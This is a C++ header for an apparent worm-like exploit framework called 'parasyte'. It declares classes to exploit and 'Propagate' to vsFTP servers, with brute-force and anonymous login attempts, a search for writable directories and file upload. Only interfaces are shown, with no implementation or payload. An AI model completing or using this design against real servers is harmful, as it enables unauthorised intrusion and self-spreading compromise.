#ifndef PARASYTE_EXPLOITS_EXPLOITBASE_HPP_
#define PARASYTE_EXPLOITS_EXPLOITBASE_HPP_

/*
    Copyright (C) 2024 by alexbsec
    Permission is hereby granted, free of charge, to any person obtaining a copy of this
    software and associated documentation files (the "Software"), to deal in the Software
    without restriction, including without l> imitation the rights to use, copy, modify, merge,
    publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons
    to whom the Software is furnished to do so, subject to the following conditions:
    The above copyright notice and this permission notice shall be included in all copies or
    substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING
    BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
    IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
    IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE
    OR OTHER DEALINGS IN THE SOFTWARE.
*/

// Include declarations

#include "../error_handler/ErrorHandler.hpp"
#include "../network/NetUtils.hpp"
#include "../network/Services.hpp"
#include "../utils/Logger.hpp"

/* CODE START */

namespace parasyte {
namespace exploits {
  using ServerInfo = parasyte::network::services::ServerInfo;

  class IStrategy {
    public:
      virtual ~IStrategy() = default;
      virtual void Execute() = 0;
  };

  class IExploiter {
    public:
      virtual ~IExploiter() = default;
      virtual void Exploit() = 0;
      virtual void Propagate() = 0;
  };

  class ExploitBase {
    public:
      ExploitBase(boost::asio::io_context& io_context, const ServerInfo& server_info, bool brute_force = false);
      ~ExploitBase();
      std::unique_ptr<IExploiter> exploiter;

    private:
      boost::asio::io_context& io_context_;
      ServerInfo server_info_;

      parasyte::utils::logging::Logger logger_ = parasyte::utils::logging::Logger("parasyte.log");
      parasyte::error_handler::ErrorHandler error_handler_;
      bool brute_force_;
  };

  namespace simple {
    namespace ftp {
      struct vsFTPParams {
          std::string host;
          std::string username;
          std::string password;
          std::string server;
          uint16_t port;
      };

      class vsFTPStrategy : public IStrategy {
        public:
          vsFTPStrategy(boost::asio::io_context& io_context, vsFTPParams params);
          ~vsFTPStrategy() override;
          void Execute() override;
          void SendFile(const std::string& file_path);

        private:
          boost::asio::io_context& io_context_;
          boost::asio::ip::tcp::socket socket_;
          std::string host_;
          std::string username_;
          std::string password_;
          std::string response_ = "";
          bool try_anon_;
          bool is_logged_in_ = false;
          parasyte::error_handler::ErrorHandler error_handler_;
          parasyte::utils::logging::Logger logger_ = parasyte::utils::logging::Logger("parasyte.log");
          bool Connect();
          void SendCommand(const std::string& command);
          bool ReadResponse();
          bool AttemptLogin();
          bool AttemptAnonLogin();
          bool AttemptUserLogin();
          std::vector<std::string> ListWritableDirectories();
          std::pair<boost::asio::ip::address, unsigned short> ParsePASVResponse(const std::string& response);
      };

      class Exploiter : public IExploiter {
        public:
          Exploiter(
            boost::asio::io_context& io_context,
            const std::string& host,
            const std::string& server,
            bool brute_force = false
          );

          ~Exploiter() override;

          void Exploit() override;
          void Propagate() override;

        private:
          boost::asio::io_context& io_context_;
          boost::asio::ip::tcp::socket socket_;
          vsFTPParams vsftpd_params_;
          std::string server_;
          std::unique_ptr<IStrategy> strategy_;
          bool try_anon_;
          bool brute_force_;
          parasyte::error_handler::ErrorHandler error_handler_;
          parasyte::utils::logging::Logger logger_ = parasyte::utils::logging::Logger("parasyte.log");
      };
    }
  }
}

namespace advanced {}
}

#endif  // PARASYTE_EXPLOITS_EXPLOITBASE_HPP_